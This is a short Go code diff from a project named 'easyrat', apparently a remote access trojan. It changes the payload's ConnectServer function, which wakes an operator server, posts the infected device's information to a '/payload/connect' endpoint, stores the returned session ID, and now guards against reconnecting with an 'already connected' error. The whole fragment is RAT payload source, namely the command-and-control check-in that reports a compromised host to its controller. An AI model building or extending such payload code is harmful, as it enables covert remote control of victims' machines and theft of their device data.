@@ -5,6 +5,7 @@ import (
 	"easyrat/payload/modules"
 	"easyrat/utils/types"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -99,19 +100,24 @@ func WakeServer() {
 
 // Connects to the server
 func ConnectServer() error {
-	WakeServer()
-	resp, err := PostJSON("/payload/connect", modules.DeviceInfo())
-	if err != nil {
-		fmt.Printf("Error connecting to server. %s\n", err.Error())
-		return err
+	if !Connected {
+		WakeServer()
+		resp, err := PostJSON("/payload/connect", modules.DeviceInfo())
+		if err != nil {
+			fmt.Printf("Error connecting to server. %s\n", err.Error())
+			return err
+		}
+		var connection types.ConnectResp
+		err = json.NewDecoder(resp.Body).Decode(&connection)
+		if err != nil {
+			panic("Error decoding json. " + err.Error())
+		}
+		ID = connection.SessionID
+		Connected = true
+		return nil
+	} else {
+		return errors.New("already connected")
 	}
-	var connection types.ConnectResp
-	err = json.NewDecoder(resp.Body).Decode(&connection)
-	if err != nil {
-		panic("Error decoding json. " + err.Error())
-	}
-	ID = connection.SessionID
-	return nil
 }
 
 // Send a disconnect message to the server
